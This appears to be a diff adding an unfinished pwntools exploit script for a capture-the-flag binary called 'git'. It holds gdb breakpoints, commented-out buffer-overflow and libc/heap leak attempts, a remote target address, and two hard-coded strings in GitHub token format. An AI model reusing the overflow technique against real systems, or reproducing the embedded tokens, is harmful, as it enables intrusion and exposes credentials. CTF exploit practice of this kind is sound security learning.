@@ -1,0 +1,73 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+import signal
+def handler(signum, frame):
+    print(signum)
+    exit()
+signal.signal(signal.SIGINT, handler)
+
+exe = ELF("./git")
+# context.log_level='debug'
+context.terminal = ["foot","tmux","new-session"]
+# p = remote("0",9001)
+p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+    # brva 0x000000000000251B
+    # b*0x55555555652e
+    # brva 0x00000000000021D6
+    # brva 0x00000000000021AD
+    # bb 000000000000252E
+    bb 00000000000016F0
+    bb 0000000000001733
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+# while True:
+#     p = remote("157.15.86.73",9001)
+# gdbs()
+# input()
+sla(">","token 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")
+sla(">","repo antkss/lmao")
+gdbs()
+# for i in range(5):
+#     sla(">",f"cat {hex(0x558+i*0x10)}")
+# p.recvuntil(b"a"*1400)
+# leak = u64(p.recv(6).ljust(8,b"\x00"))
+# log.info(f"leak: {hex(leak)}")
+# if b"0x7f" in hex(leak).encode():
+#     log.info(f"leak: {hex(leak)}")
+#     break
+
+# sla(">","token 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")
+# sla(">","repo antkss/lmao")
+# sla(">","cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
+# input()
+# sla(">",f"cd {b"a"*(104+152)}")
+# for i in range(300):
+#     sla(">","cd cac")
+
+    # libc.address = leak - 0x1e7f0a
+    # log.info(f"leak: {hex(leak)}")
+    # p.recvuntil(b"a"*84).ljust(8,b"\x00")
+    # leak_heap = u64(p.recv(6).ljust(8,b"\x00"))
+    # log.info(f"heap: {hex(leak_heap)}")
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
